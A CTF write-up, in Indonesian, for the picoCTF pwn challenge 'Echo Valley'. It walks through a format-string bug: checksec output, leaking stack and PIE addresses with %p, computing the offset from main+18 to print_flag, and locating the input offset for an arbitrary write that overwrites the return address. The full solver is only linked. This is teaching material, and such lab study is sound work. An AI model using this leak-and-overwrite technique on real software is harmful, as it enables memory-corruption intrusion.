di chall ini untuk PIE protection nya aktif,jadi address nya akan berubah ubah setiap kali binary/ELF di jalankan.
```
File:     /mnt/d/aboutCTF/picoCTF/pico/pwn/Echo Valley/valley
Arch:     amd64
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
Debuginfo:  Yes
```
Jika di lihat,function dari main ini hanya akan menjalankan function dari `echo_valley ` ,sedangkan ada function yang memberikan kita flag yaitu pada `print_flag`.Namun,function itu sendiri tidak dijalankan langsung oleh main,jadi disini menurut saya,kita harus menggunakan format string bug arbitrary write
agar kita bisa trigger fungsi `print_flag` ini dan kita mendapatkan flag nya.

```markdown
```asm
0x0000000000001401 <+0>:     endbr64
   0x0000000000001405 <+4>:     push   rbp
   0x0000000000001406 <+5>:     mov    rbp,rsp
   0x0000000000001409 <+8>:     mov    eax,0x0
   0x000000000000140e <+13>:    call   0x1307 <echo_valley>
   0x0000000000001413 <+18>:    mov    eax,0x0
   0x0000000000001418 <+23>:    pop    rbp
   0x0000000000001419 <+24>:    ret
```
saat saya coba untuk format strings:
```
Welcome to the Echo Valley, Try Shouting:
%20$p.%21$p
You heard in the distance: 0x7ffd5b80b6f0.0x5d97ca02d413
```
leak format strings ke 21 itu adalah leak address dari `main+18`, kita coba kalkulasikan berapa offset dari `main+18 ` ini ke - `print_flag`

```
pwndbg> p/x 0x0000000000001413-0x0000000000001269
$1 = 0x1aa
```
jadi, offset nya adalah `0x1aa`,ini akan kita gunakan nanti untuk payload solvernya.Karena function print_flag tidak pernah dipanggil oleh program.Jadi,disini kita bisa bilang kita akan melakukan hijack control flow(overwrite return address) agar program menjalankan `print_flag` dan kita mendapatkan flag-nya.

kita akan gunakan address dari leak `%20%p` sebagai return address dengan jarak dari address itu ke leak `main+18` sebesar 8 byte.

Next,untuk 0ffset nya ,pertama kita cari di offset keberapakah user input kita.

```
Welcome to the Echo Valley, Try Shouting:
AAAAAAAA|%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p
You heard in the distance: AAAAAAAA|0x7ffdf12d5910.(nil).(nil).(nil).0x73de5d407ee0.0x4141414141414141.0x252e70252e70257c.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0x252e70252e70252e.0x2e70252e70252e70.0x70252e70252e7025.0xa70252e70252e.(nil).(nil).0xc873fe81287a1100.0x7ffdf12d5b40.0x59cf08c2a413.0x7ffdf12d5be0.0x73de5d227675.0x73de5d563000.0x7ffdf12d5c68.0x1f12d5ba0
exit
The Valley Disappears
```
bisa di lihat,user input kita adalah pada urutan ke-6,jadi offset yang akan kita gunakan dalam format strings payload nya adalah 6.

[Solver](solver.py)
